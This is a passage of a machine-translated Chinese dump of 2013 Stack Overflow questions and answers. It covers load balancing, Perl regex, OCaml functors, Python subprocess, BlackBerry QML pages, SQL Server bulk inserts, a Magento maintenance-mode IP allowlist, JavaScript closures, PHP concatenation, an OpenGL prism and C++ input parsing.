> 当我们有多个具有相同设置的独立服务器时，负载平衡也可以在没有集群的情况下发生，但除此之外，彼此不知道。然后，我们可以使用负载平衡器将请求转发到一台服务器或另一台服务器，但一台服务器不使用另一台服务器的资源。此外，一种资源不与其他资源共享其状态。每个负载均衡器基本上都执行以下任务： 不断检查哪些服务器已启动。收到新请求时，根据负载平衡策略将其发送到其中一台服务器。当收到对已经有会话的用户的请求时，将用户发送到*同一个会话* 服务器（这部分很重要，否则用户将继续在不同的服务器之间移动，但无法真正做任何工作）。提供静态页面不需要这部分，在这种情况下，没有用户会话。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-02-26T14:57:58.130

集群意味着您在多台机器（节点）上运行程序。您想要这样做的一个原因是：负载平衡。如果您对单台机器有太多的负载/工作要做，您可以使用一组机器来代替。然后负载均衡器可以将负载分布到集群中的节点上。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-02-26T14:58:34.950

> 集群是一组应用程序服务器，它们透明地运行您的 J2EE 应用程序，就好像它是一个单独的实体一样。

[来源](http://www.javaworld.com/jw-02-2001/jw-0223-extremescale.html)

> 在基础架构方面，处理负载必须分布在服务器组之间。这称为服务器负载平衡。

[来源](http://www.javaworld.com/javaworld/jw-10-2008/jw-10-load-balancing-1.html)

所以基本上*集群*就是创建一个集群，而*负载均衡*就是在集群中的节点之间分配负载

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-27T12:20:06.910

**集群：** 集群在企业应用程序开发领域变得越来越重要。只需在多个 Java 虚拟机 (JVM) 之间共享应用程序状态

**负载平衡** 很简单，就像平衡请求并转发到适当的服务器以处理请求

# regex - perl 正则表达式替换单个数组元素

> ID：15092138
> 
> 赞同：0
> 
> 时间：2013-02-26T14:53:24.777
> 
> 标签：regex, perl

我想从 for 循环中读取多行并将它们拆分。之后我想对单个数组元素进行替换。

```
my @fs = split(';', $line);
$fs[0] =~ s/\"//g; 
```

然而，这不起作用。线

```
$fs[0] =~ s/\"//g; 
```

返回编译器错误。

有一个更好的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T14:54:48.570

将行更改`split`为

```
my @fs = split(/;/, $line); 
```

因为`split`将正则表达式作为其第一个操作数。

我怀疑您看到的解析错误是由于其他地方的错误造成的，因为您问题中代码的语法是正确的。

一般来说，总是修复解析器诊断出的*第一个错误。*好的解析器会尝试恢复以报告尽可能多的错误，但这个过程并不总是可靠的。您看到的错误的确切文本是什么？

# ocaml - OCaml：更高种类的多态性（对模块进行抽象？）

> ID：15092139
> 
> 赞同：13
> 
> 时间：2013-02-26T14:53:25.243
> 
> 标签：ocaml, monads, higher-kinded-types

假设我有一个选项列表：

```
let opts = [Some 1; None; Some 4] 
```

我想将这些转换为列表选项，例如：

*   如果列表包含`None`，则结果为`None`
*   否则，将收集各种整数。

[对于这种特定情况（使用Core](https://github.com/janestreet/core/blob/master/lib)和`Monad`模块）编写这个相对简单：

```
let sequence foo =
let open Option in
let open Monad_infix in
  List.fold ~init:(return []) ~f:(fun acc x ->  
    acc >>= fun acc' -> 
    x >>= fun x' -> 
    return (x' :: acc')
    ) foo;; 
```

但是，正如问题标题所暗示的那样，我真的很想对类型构造函数进行抽象，而不是专门针对`Option`. 核心似乎使用函子来提供更高种类的类型的效果，但我不清楚如何编写要在模块上抽象的函数。在 Scala 中，我会使用一个隐含的上下文来要求某些`Monad[M[_]]`. 我期望没有办法隐式传递模块，但我将如何明确地做到这一点？换句话说，我可以写一些近似于这个的东西：

```
let sequence (module M : Monad.S) foo =
let open M in
let open M.Monad_infix in
  List.fold ~init:(return []) ~f:(fun acc x ->  
    acc >>= fun acc' -> 
    x >>= fun x' -> 
    return (x' :: acc')
    ) foo;; 
```

这是可以用一流的模块完成的吗？

编辑：好的，所以我实际上并没有尝试使用该特定代码，而且它似乎比我预期的更接近工作！似乎语法实际上是有效的，但我得到了这个结果：

```
Error: This expression has type 'a M.t but an expression was expected of type 'a M.t
The type constructor M.t would escape its scope 
```

错误的第一部分似乎令人困惑，因为它们匹配，所以我猜问题出在第二部分 - 这里的问题是返回类型似乎没有确定吗？我想它取决于传入的模块 - 这是一个问题吗？有没有办法修复这个实现？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-02-26T16:05:18.757

首先，这是您的代码的独立版本（使用 `List.fold_left`标准库的遗留版本），适用于手头没有 Core 但仍想尝试编译您的示例的人。

```
module type MonadSig = sig
  type 'a t
  val bind : 'a t -> ('a -> 'b t) -> 'b t
  val return : 'a -> 'a t
end

let sequence (module M : MonadSig) foo =
  let open M in
  let (>>=) = bind in
  List.fold_left (fun acc x ->  
    acc >>= fun acc' -> 
    x >>= fun x' -> 
    return (x' :: acc')
  ) (return []) foo;; 
```

您收到的错误消息意味着（可以忽略令人困惑的第一行） Mt 定义是`M`模块的本地定义，并且不能逃脱其范围，这将与您尝试编写的内容有关。

这是因为您使用的是一流的模块，它允许对模块进行抽象，但不允许具有依赖外观的类型，例如返回类型取决于参数的模块值，或者至少是 *路径*（此处`M`）。

考虑这个例子：

```
module type Type = sig
  type t
end

let identity (module T : Type) (x : T.t) = x 
```

这是错误的。错误消息指向`(x : T.t)`并说：

```
Error: This pattern matches values of type T.t
       but a pattern was expected which matches values of type T.t
       The type constructor T.t would escape its scope 
```

您*可以*做的是在对一流模块 T 进行抽象之前对所需类型进行抽象，这样就没有转义了。

```
let identity (type a) (module T : Type with type t = a) (x : a) = x 
```

这依赖于显式抽象类型变量的能力`a`。不幸的是，这个特性还没有扩展到对高级变量的抽象。你目前*不能*写：

```
let sequence (type 'a m) (module M : MonadSig with 'a t = 'a m) (foo : 'a m list) =
  ... 
```

解决方案是使用函子：不是在值级别工作，而是在模块级别工作，它具有更丰富的语言。

```
module MonadOps (M : MonadSig) = struct
  open M
  let (>>=) = bind

  let sequence foo =
    List.fold_left (fun acc x ->  
      acc >>= fun acc' -> 
      x >>= fun x' -> 
      return (x' :: acc')
    ) (return []) foo;;
end 
```

您无需在 monad 上抽象每个 monadic 操作（`sequence`,`map`等），而是进行模块范围的抽象。

# python - 在 Python 和 Windows 7 中使用“findstr”循环 stdout 命令行内容

> ID：15092140
> 
> 赞同：2
> 
> 时间：2013-02-26T14:53:26.183
> 
> 标签：python, subprocess, windows-7-x64

我正在编写一个 python 脚本，它使用 Windows 命令行向设备发送命令，然后读取输出迭代其内容：

```
proc = subprocess.Popen("adb logcat | findstr Test", stdout=subprocess.PIPE)
for line in proc.stdout:
    if "stopped" in line:
        print line
        print "Test Service finished \n"
        break
    else:
        print line 
```

不幸的是，我得到以下信息：

```
>>> 
/system/bin/sh: findstr: not found
output error: Broken pipe 
```

它可以在没有“| findstr Gps”的情况下工作，但是发送到管道的输出量太大，最终导致内存事件。

任何想法我做错了什么？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:53:36.523

我认为这可能有效（不确定是否`stderr=subprocess.PIPE`真的有必要，尽管它不应该受到伤害）：

```
proc = subprocess.Popen("adb logcat | findstr Test", stdout=subprocess.PIPE,
                                                     stderr=subprocess.PIPE))
stdoutdata, stderrdata = proc.communicate()
for line in stdoutdata:
    if "stopped" in line:
        print line
        print "Test Service finished \n"
        break
    else:
        print line 
```

# blackberry-10 - 如何在 C++ 代码中单击按钮时推送 QML 页面

> ID：15092142
> 
> 赞同：0
> 
> 时间：2013-02-26T14:53:28.770
> 
> 标签：blackberry-10, blackberry-cascades

我正在开发一个 BB 10 应用程序，其中我用 C++ 编写了第一页（使用 NavigationPane）。现在我想在按钮单击时在 NavigationPane 中推送另一个 qml 页面。我试过以下代码但没有运气

```
QmlDocument *qml = QmlDocument::create("asset:///main.qml").parent(this);
if (!qml->hasErrors()) {
    Page *page = qml->createRootObject<Page>();

    mRoot->push(page);

} 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T01:11:51.537

以下是如何`NavigationPane`在 C++ 中使用推送页面：

源文件：

```
#include <bb/cascades/Application>
#include <bb/cascades/Button>
#include <bb/cascades/Label>
#include <bb/cascades/ActionItem>
#include <bb/cascades/Container>
#include <bb/cascades/DockLayout>
#include <bb/cascades/TitleBar>
#include <bb/cascades/NavigationPaneProperties>
#include "Sandoxproject.hpp"

using namespace bb::cascades;

SandboxApp::SandboxApp(bb::cascades::Application *app)
: QObject(app)
{
    _navPane.reset(NavigationPane::create());
    Page* firstPage = createFirstPage();
    _navPane ->push(firstPage);
    _secondPage.reset(createSecondPage());
    app->setScene(_navPane.data());
}

bb::cascades::Page* SandboxApp::createFirstPage() {
    Page* page = new Page();
    Container* content = new Container();
    TitleBar* titleBar = TitleBar::create().visibility(ChromeVisibility::Visible).title("First Page");
    page->setTitleBar(titleBar);
    content->setLayout(DockLayout::create());
    Button* button = Button::create().text("Go to another page").horizontal(HorizontalAlignment::Center).vertical(VerticalAlignment::Center);
    connect(button, SIGNAL(clicked()), this, SLOT(pushPage()));
    content->add(button);
    page->setContent(content);
    return page;
}

bb::cascades::Page* SandboxApp::createSecondPage() {
    Page* page = new Page();
    TitleBar* titleBar = TitleBar::create().visibility(ChromeVisibility::Visible).title("Second Page");
    page->setTitleBar(titleBar);
    ActionItem* backAction = ActionItem::create();
    connect(backAction, SIGNAL(triggered()), _navPane.data(), SLOT(pop()));
    page->setPaneProperties(NavigationPaneProperties::create().backButton(backAction));
    Container* content = new Container();
    content->setLayout(DockLayout::create());
    content->add(Label::create().text("This is the second page").horizontal(HorizontalAlignment::Center).vertical(VerticalAlignment::Center));
    page->setContent(content);
    return page;
}

void SandboxApp::pushPage() {
    qDebug("pushing another page...");
    _navPane->push(_secondPage.data());
} 
```

头文件：

```
#ifndef Sandoxproject_HPP_
#define Sandoxproject_HPP_

#include <bb/cascades/NavigationPane>
#include <bb/cascades/Page>
#include <QObject>

namespace bb { namespace cascades { class Application; }}

class SandboxApp : public QObject
{
    Q_OBJECT
public:
    SandboxApp(bb::cascades::Application *app);
    virtual ~SandboxApp() {}

private slots:
     void pushPage();

private:
    bb::cascades::Page* createFirstPage();
    bb::cascades::Page* createSecondPage();

    QScopedPointer<bb::cascades::NavigationPane> _navPane;
    QScopedPointer<bb::cascades::Page> _secondPage;

    Q_DISABLE_COPY(SandboxApp);
};

#endif /* Sandoxproject_HPP_ */ 
```

# hsqldb - 通过 hsqldb 中的 sqltool 实用程序执行 .sql 文件

> ID：15092145
> 
> 赞同：1
> 
> 时间：2013-02-26T14:53:38.397
> 
> 标签：hsqldb, sqltools

我正在尝试通过以下方式执行 demofeature_enable.sql 文件。

```
 java -jar sqltool.jar --inlineRC=url=jdbc:hsqldb:hsql://localhost:9999/bwdb,user=sa,password= demofeature_enable.sql 
```

上面的命令抛出以下错误

```
 Exception in thread "main" java.lang.Error: Error: could not match input
    at org.hsqldb.cmdline.sqltool.SqlFileScanner.zzScanError(Unknown Source)
    at org.hsqldb.cmdline.sqltool.SqlFileScanner.yylex(Unknown Source)
    at org.hsqldb.cmdline.SqlFile.scanpass(Unknown Source)
    at org.hsqldb.cmdline.SqlFile.execute(Unknown Source)
    at org.hsqldb.cmdline.SqlTool.objectMain(Unknown Source)
    at org.hsqldb.cmdline.SqlTool.main(Unknown Source) 
```

# ios - 函数的可选值（不是方法）

> ID：15092146
> 
> 赞同：0
> 
> 时间：2013-02-26T14:53:39.423
> 
> 标签：ios, objective-c

我知道有一种方法可以使用目标 c 中的方法获取可选值或默认值，但是有没有办法用函数来做到这一点？

尝试与方法相同的方式会产生冲突类型错误。

IE..

```
void myfunc();
void myfunc(NSInteger myval); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T14:55:22.620

在 Cocoa 中没有所谓的函数。

如果您像在 C++ 中那样使用默认参数，那么 Cocoa 中就没有这样的东西。

但是，您可以让多个方法使用不同的参数共享相同的名称：

```
 init //no arguments
 initWithName: //one argument
 initWithName:age:  //two arguments 
```

您可以通过以下方式接近此 C++ 默认参数方法：

```
int sum(int a, int b=0, int c=0){
    return a+b+c;
} 
```

在objective-c中，但永远不要这样做：

~~-(NSInteger)sumA:(NSInteger)a withB:(NSInteger)b withC:(NSInteger)c{~~

 ~~```
 if(c==NIL) c=0;
    if(b==NIL) b=0;
    return a+b+c;
} 
```~~ 

并将其称为：`[self sumA:10 withB:5 withC:nil];`

# c# - SQL Server + 循环插入性能

> ID：15092147
> 
> 赞同：0
> 
> 时间：2013-02-26T14:53:40.530
> 
> 标签：c#, sql, sql-server-2008-r2

我正在执行如下所示的循环插入（方法 A），似乎用每个循环调用数据库并不是一个好主意。我发现另一种方法是在我的 SProc 中循环一个逗号分隔的字符串，而不是执行插入操作，以便只有一个数据库条目。在性能方面会有任何显着改善吗？：

**方法一：**

```
foreach (DataRow row in dt.Rows) 
{
    userBll = new UserBLL();
    UserId = (Guid)row["UserId"];
    // Call userBll method to insert into SQL Server with UserId as one of the parameter.
} 
```

**方法B：**

```
string UserIds = "Tom, Jerry, 007"; // Assuming we already concatenate the strings. So no loops this time here.
userBll = new UserBLL();  
// Call userBll method to insert into SQL Server with 'UserIds' as parameter. 
```

**方法 B SProc / 在 SProc 中执行循环插入。**

```
if right(rtrim(@UserIds ), 1) <> ','
    SELECT @string = @UserIds + ','

SELECT @pos =  patindex('%,%' , @UserIds )

while @pos <> 0 
begin
    SELECT @piece = left(@v, (@pos-1))

    -- Perform the insert here

    SELECT @UserIds = stuff(@string, 1, @pos, '')
    SELECT @pos =  patindex('%,%' , @UserIds )
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:03:33.043

更少的查询通常意味着更快的处理。也就是说，我的一位同事在使用 .NET Framework 的 TSQL 包装器方面取得了一些成功，该包装器`BULK INSERT`由框架提供为`SqlBulkCopy`. [此 MSDN 博客条目展示了如何使用它](http://blogs.msdn.com/b/nikhilsi/archive/2008/06/11/bulk-insert-into-sql-from-c-app.aspx)。

主要的“API”示例是这样的（取自链接的文章，它将 DataTable 的内容写入 SQL）：

```
private void WriteToDatabase()
{
    // get your connection string
    string connString = "";
    // connect to SQL
    using (SqlConnection connection = 
            new SqlConnection(connString))
    {
        // make sure to enable triggers
        // more on triggers in next post
        SqlBulkCopy bulkCopy = 
            new SqlBulkCopy
            (
            connection, 
            SqlBulkCopyOptions.TableLock | 
            SqlBulkCopyOptions.FireTriggers | 
            SqlBulkCopyOptions.UseInternalTransaction,
            null
            );

        // set the destination table name
        bulkCopy.DestinationTableName = this.tableName;
        connection.Open();

        // write the data in the "dataTable"
        bulkCopy.WriteToServer(dataTable);
        connection.Close();
    }
    // reset
    this.dataTable.Clear();
    this.recordCount = 0;
} 
```

链接的文章解释了利用这种机制需要做什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:11:43.563

根据我的经验，您不想为每条记录做三件事：

1.  每行打开/关闭一个 sql 连接。此问题由 ADO.NET 连接池处理。除非您禁用了池，否则您不必担心它。

2.  每行的数据库往返。这往往与网络带宽或网络延迟无关，而与客户端线程休眠有关。每次唤醒时，您都希望在客户端进行大量工作，或者您正在浪费时间片。

3.  打开/关闭每行的 sql 事务日志。打开和关闭日志不是免费的，但你也不想让它打开太久。在单个事务中进行多次插入，但不要太多。

在其中任何一个上，您可能会看到从每个请求 1 行到每个请求 10 行的许多改进。您可以通过在传输批处理之前在客户端构建 10 个插入语句来实现这一点。

您将列表发送到 proc 的方法已由[Sommarskog](http://www.sommarskog.se/arrays-in-sql.html)进行了极其深入的描述。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T14:58:11.183

如果您正在寻找具有给定类型的多个输入值的更好插入性能，我建议您查看[table valued parameters](http://msdn.microsoft.com/en-us/library/bb510489.aspx)。

可以在[这里](http://www.codeproject.com/Articles/39161/C-and-Table-Value-Parameters.)找到一个示例，其中显示了一些使用它们的示例代码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T15:05:28.287

您可以为此使用批量插入功能。

有关详细信息，请参阅此博客：http: [//blogs.msdn.com/b/nikhilsi/archive/2008/06/11/bulk-insert-into-sql-from-c-app.aspx](http://blogs.msdn.com/b/nikhilsi/archive/2008/06/11/bulk-insert-into-sql-from-c-app.aspx)

# magento - maintenance.flag 文件使用

> ID：15092148
> 
> 赞同：3
> 
> 时间：2013-02-26T14:53:40.750
> 
> 标签：magento, magento-1.7, maintenance

当我第一次开始使用 Magento 并且我第一次进行备份时，我勾选了将网站置于维护模式按钮。完成此操作后，当我尝试访问我的网站时，我收到了 503 错误（我认为）。我发现这是由于 magento 创建了一个 maintenance.flag 文件。

我开始明白，这用于在您更新或备份内容时阻止人们访问您的网站。

我的问题是这个。. .

是否可以使用 maintenance.flag 文件来阻止人们在您进行物理更新和检查时访问您的站点。我有 2 台服务器一个测试服务器和一个实时服务器。实时服务器使用 SSL，并且比我拥有的免费测试服务器快得多。目前我正在测试服务器上进行更改，然后在我知道它可以正常工作并且看起来还不错后上传到实时服务器。

由于我们将 SSL 应用于实时服务器。当我进行更新时，某些事情正在（或没有）发生。我想知道我是否可以在检查我的更新然后允许人们重新访问时暂时阻止对我的网站的访问。

maintenance.flag 文件也阻止我离开我的网站，据我所知，我想要做的事情是不可能的。

任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-26T15:40:43.980

是的，可以设置维护标志，然后让您`index.php`检查一组允许通过的地址，同时为其他所有人提供 503 页面。在设置 maintenance.flag 时，仅允许这些系统进行管理员和公共访问。找到该部分`index.php`并进行一些修改。我在 Magento 1.4.2.0 上使用以下内容，检查以确保 1.7 使用相同的机制`index.php`：

```
$maintenanceFile = 'maintenance.flag';
$ip = $_SERVER['REMOTE_ADDR'];

/***************
 * IP's allowed in maintenance.
 * Use publicly visible IP addresses on LIVE, local if on DEV
 ***************/

$allowed = array('10.0.0.100','10.0.0.101','10.0.0.20');

if (file_exists($maintenanceFile) && !in_array($ip, $allowed)) {
    $basePath = dirname($_SERVER['PHP_SELF']);
    include_once dirname(__FILE__) . '/errors/503.php';
    exit;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-26T15:42:40.653

商店维护： http: [//www.magentocommerce.com/magento-connect/store-maintenance.html](http://www.magentocommerce.com/magento-connect/store-maintenance.html)

此扩展程序将满足您的需求。

# javascript - 如何调用方法

> ID：15092151
> 
> 赞同：-1
> 
> 时间：2013-02-26T14:53:53.543
> 
> 标签：javascript, jquery

我的项目中有几个具有这种结构的 js 文件：

```
(function (window, $) {
    var reload = function (force) { /* implementation here */ };
    //more variables are here, the same construction as above
})(this, $); 
```

更多这样的文件，对于网站的每个部分（页面）都有一个具有这种结构的js来管理页面。整个站点是一个单独的页面，这些 js 文件通过隐藏、显示和填充内容来管理 DOM 节点，这给用户一种错觉，他/她浏览了多个页面。

1.  我想简单解释一下如何加载上述结构 - 我看到加载所有这些 js 脚本的 head.js 库，但我不明白加载的位置，如何访问它。

2.  我想知道如何自己访问我需要的特定 reload() 。正如我告诉你的，更多的 js 文件具有相同的结构（resources.js、users.js、reports.js 等）。我如何访问内部的重新加载功能，比方说，在我加载所有这些脚本的html中按下按钮时的reports.js？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:00:34.573

仅考虑那段代码，#2 的答案是：您无法`reload`从外部访问。它被声明为“立即调用的函数表达式”的局部变量，这是一个在定义后立即调用的函数（我希望它回答 #1）。

通常，thats 用于创建将公开一些方法和属性的模块。例如，如果代码是：

```
var obj = (function (window, $) {

    var reload = function (force) { /* implementation here */ };

    return {
        reload : reload
    };

})(this, $); 
```

`realod`然后你可以调用

```
obj.reload(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:00:36.663

除非您修改这些 .js 文件，否则您无法访问这些变量。

```
(function (window, $) {

    var reload = function (force) { /* implementation here */ };

    //more variables are here, the same construction as above

    window.reload = reload;

})(this, $); 
```

上面的代码使变量/方法`reload`可以从代码外部获得。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-26T15:03:45.017

这是一个自调用函数，这是一种很好的做法，可以避免重复使用变量标识符和破坏第三方代码。

另一点是在自调用函数内声明的变量在函数体范围内或全局范围内都可用。这也很好，因为可以在函数结束时收集脚本期间创建的“垃圾”（好吧，如果您在*clousure*中使用它们，则并非总是如此）。

此外，由于您在函数范围内声明了此类变量，因此其他库在自己的“自调用函数范围”中执行操作将使用像您一样的变量和函数标识符，但这没问题，因为两者都是不同的范围！

```
function (window, $) 
```

在上述签名的情况下，自调用函数有两个输入参数：

*   *window*将保存 JavaScript 浏览器的 Window 对象。
*   *$*将保存一个快捷方式对象或函数（通常是 jQuery）。

声明这样的输入参数可以避免很多问题，因为可以重用`window`标识符并存储另一个对象，但在您的自调用函数范围内，无论如何`window`都会保存该对象，因为它是一个不同的引用。`Window`

> 我如何访问内部的重新加载功能，比方说，在我加载所有这些脚本的html中按下按钮时的reports.js？

您正在声明一个存储整个`reload()`函数的局部变量。为了能够在任何范围内访问它，您需要在*全局范围内*声明它：

```
var reload = null;

(function (window, $) {
    // Setting the variable living in the global scope!
    reload = function (force) { /* implementation here */ };

    //more variables are here, the same construction as above

})(this, $); 
```

# c# - 如何使用多个 Web 浏览器使用线程

> ID：15092155
> 
> 赞同：0
> 
> 时间：2013-02-26T14:53:56.287
> 
> 标签：c#, browser

我正在开发一个应用程序，我想创建多个线程，每个线程必须创建一个`WebBrowser`，每个线程都`WebBrowser`使用方法`webBrowser_DocumentCompleted`。

每个创建的`WebBrowser`实例如何拥有自己的`DocumentCompleted`处理程序，而不是所有实例都使用相同的`webBrowser_DocumentCompleted`方法。

我解释 ：

在一种情况下，使用单个 Web 浏览器的操作

```
int a = 0;
private void button1_Click(object sender, EventArgs e)
{
    methode1();
}

private void webBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
{
    if (a == 1) methode2(wb);
    if (a == 2) methode2(wb);
}

public void methode1()
{
    webBrowser.Navigate("http://www.test.com");
    a = 1;
}

public void methode2()
{
    HtmlElement txt1 = webBrowser1.Document.GetElementById("tesxtbox1");
    txt1.SetAttribute("value", "test");
    webBrowser.Document.Forms[0].InvokeMember("submit");
    a = 2;
}

public void methode3()
{
    webBrowser.Navigate("http://www.test3.com");
} 
```

但如果我想进行多项操作，即在 butoon1 中添加：

```
private void button1_Click(object sender, EventArgs e)
{
    for(int i=0; i<5  ;i++)
        methode1();
} 
```

那就去做吧，我想我必须有几个webbrowser，所以解决方法是为每个操作创建一个线程

```
private void button1_Click(object sender, EventArgs e)
{
    for(int i=0; i<5  ;i++)
    {
        Thread thread = new Thread(new ThreadStart(method1));
        thread.Start();
    }   
} 
```

因此，线程创建的每个 Web 浏览器都必须有自己的方法`webBrowser_DocumentCompleted`，以免与其他 Web 浏览器的结果混淆。

或者，`webBrowser_DocumentCompleted`对所有创建的 Web 浏览器使用相同的方法，但问题是如何指定哪个 Web 浏览器，调用方法 webBrowser_DocumentCompleted。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:08:52.440

你没有在你的线程中创建几个网络浏览器，你仍然只是在使用你没有告诉我们的地方创建的一个。

尝试在 methode 函数中实际创建 webbrowser 对象

```
private void button1_Click(object sender, EventArgs e)
        {
            for(int i=0;i<5;i++)
                methode1();
        }

public void methode1()
        {
            System.Windows.Forms.WebBrowser wBrowser = System.Windows.Forms.WebBrowser();
            wBrowser.DocumentCompleted +=webBrowser_DocumentCompleted;
            wBrowser.Navigate("http://www.test.com");
            a = 1;
        } 
```

另外，您知道您可以在一个 if 语句中检查 a 的两个值，对吗？

```
if(a==1 || a==2)
     methode2(wb); 
```

# php - URL中需要PHP连接运算符空间吗？

> ID：15092157
> 
> 赞同：-1
> 
> 时间：2013-02-26T14:53:58.330
> 
> 标签：php

**我注意到大多数使用连接运算符的示例在“ .** ”之前和之后显示一个空格。

例如：

```
header('Location: http://google.com?c1=' . $var1 . '&c2=' . $var3); 
```

但这似乎在这个例子中没有空格就可以正常工作：

```
header('Location: http://google.com?c1='.$var1.'&c2='.$var3); 
```

第二种方式使用连接运算符有什么问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T14:55:10.880

不，添加空格是为了提高可读性。

就像

```
if($var=='test'){echo'ok';} 
```

和

```
if ($var == 'test') 
{
    echo  'ok';
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T14:58:36.753

这些空格不是必需的，但它们使阅读更容易。

[php手册](http://www.php.net/manual/en/language.operators.string.php#88827)

# c++ - OpenGL中n面棱镜的代码

> ID：15092161
> 
> 赞同：2
> 
> 时间：2013-02-26T14:54:15.803
> 
> 标签：c++, math, opengl

是否有任何代码可以在 OpenGL 中计算和绘制 n 面棱镜？它应该像

```
void DrawPrism(long sides) {

 glNormal3f( ...);
 glTexCoord2f(..);
 glVertex3f(...);
 [...]

}

DrawPrism(5) 
```

![在此处输入图像描述](../Images/32c14cfdd0c63629cfbc34e32adfc87e.png)

基本上我所需要的只是**底座边缘的 x-y 位置**。其余的计算由 GL 完成。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-26T16:03:47.680

新答案：

要计算五边形顶点的坐标，请查看我为您制作的视频：http: [//www.youtube.com/watch?v=qqu6LknbQsg](http://www.youtube.com/watch?v=qqu6LknbQsg)

要计算五边形的高度，等式是：![在此处输入图像描述](../Images/2b001db36f7df400ecdb2d489ab001a9.png) ^取自[Wolfram Alpha](http://www.wolframalpha.com/input/?i=height%20of%20a%20penatgon&a=*C.penatgon-_*Geometry-)

* * *

由 Kenobi 填充：如上面的视频中所述，A、B、C、D、E 是五边形的边缘。F,G,H,I,J 是第二个一起形成棱柱的五边形。Sin 和 cos 以度为单位。然后我们有以下顶点：

```
 Ax = 0                 ; Ay = h/2,               ; Az = -1;
  Bx = s/2 + s * sin(18) ; By = -h/2 + s*cos(18)   ; Bz = -1;
  Cx = s/2               ; Cy = -h/2               ; Cz = -1;
  Dx = -s/2              ; Dy = -h/2               ; Dz = -1;
  Ex = -s/2 - s * sin(18); Ey = -h/2 + s*cos(18)   ; Ez = -1;

  Fx = 0                 ; Fy = h/2,               ; Fz = 1;
  Gx = s/2 + s * sin(18) ; Gy = -h/2 + s*cos(18)   ; Gz = 1;
  Hx = s/2               ; Hy = -h/2               ; Hz = 1;
  Ix = -s/2              ; Iy = -h/2               ; Iz = 1;
  Jx = -s/2 - s * sin(18); Jy = -h/2 + s*cos(18)   ; Jz = 1; 
```

然后你就做

```
glVertex3f(Ax,Ay,Az); 
glVertex3f(Bx,By,Bz);
[...] 
```

* * *

* * *

编辑：下面的先前答案（*对于所有多边形，而不仅仅是五边形）：

* * *

[这](http://www.youtube.com/watch?v=CWbTKm3a5Fw)是我为您制作的关于如何生成任何 2D n-gon... 生成任何 3D 形状（n-hedron）的视频**，**您可以使用数学“网络”（骨架结构）将这些不同的 n-gons 组合成) 的 3D 对象并计算角度（所有这些公式都可以通过搜索 n-hedron 内角公式或 n-hedron _____ 找到）或者您可以按照我绘制这些 n-gons 的相同方式绘制它们（在视频）只是使用不同颜色的线条来模拟阴影（但你必须在 3D 空间中将它们打开，我知道你可以在 c++ 中做到这一点，所以你很好。

无论如何，**这是我的视频**：[http ://www.youtube.com/watch?v=CWbTKm3a5Fw](http://www.youtube.com/watch?v=CWbTKm3a5Fw)

这就是几何网络（前面提到的），以防您想知道： ![在此处输入图像描述](../Images/4d3c6fa25b03cee4bda0ad65d202bb3c.png)

这篇文章展示了用于计算诸如面的 n 面体内角之类的数学，可能非常有帮助：[http ://www.kjmaclean.com/Geometry/IcosaDodeca.html](http://www.kjmaclean.com/Geometry/IcosaDodeca.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:04:03.223

不，即使在 Glut 中也没有创建它的函数。可悲的是，您将不得不手动创建它。基本二次曲线不在基本 OpenGL 上。使用 GLUT 你有一些功能：

[http://www.cs.csustan.edu/~rsc/SDSU/Modeling.GLU.GLUT.pdf](http://www.cs.csustan.edu/~rsc/SDSU/Modeling.GLU.GLUT.pdf)

但仅此而已。

# c++ - C ++读取固定数量的整数行，每行中的整数数量未知

> ID：15092172
> 
> 赞同：3
> 
> 时间：2013-02-26T14:54:48.927
> 
> 标签：c++, dev-c++

我正在尝试读取数据并解决简单的问题，数据：

```
3               - number of lines to read in
1 1
2 2 2
3 4 
```

输入每一行后，我想获得输入数字的总和，但每行中的整数数是未知的。使用上述数据屏幕后应如下所示：

```
3               
1 1
Sum: 2
2 2 2
Sum: 6
3 4 
Sum: 7 
```

但是从我的算法中我得到了输出：

```
3
1 1
Sum: 1
2 2 2
Sum: 4
3 4
Sum: 3 
```

我已经编写了代码，但它不能正常工作（如上）： **版本**
**我改进了我的代码并且知道它在没有字符串等的情况下可以正常工作，正确的代码如下：**

```
#include<iostream>
using namespace std;
int main()
{
    int x;
    int t, sum;
    cin >> t;

    for(int i=0; i<t; i++) {
        sum=0;
        while(true)
        {
            cin >> x;
            sum = sum + x;  
            if(cin.peek()=='\n')
                break; //conditional break
        }
        cout << "Sum: " << sum << "\n";
    }
    return(0);
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-26T15:00:24.223

一次读取一行，使用`getline`, 到类型的对象中`std::string`。然后使用该`std::string`对象初始化 type 的对象`std::istringstream`，并使用提取器`int`从流对象中读取值，直到它失败。然后返回并阅读下一行。大致：

```
std::string line;
while (std::getline(std::cin, line)) {
    std::istringstream in(line);
    int sum = 0;
    int value = 0;
    while (in >> value)
        sum += value;
    std::cout << sum << '\n';
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:23:05.647

C++ 为您提供了许多工具：

*   `string`是一个管理字符串生命周期的类。
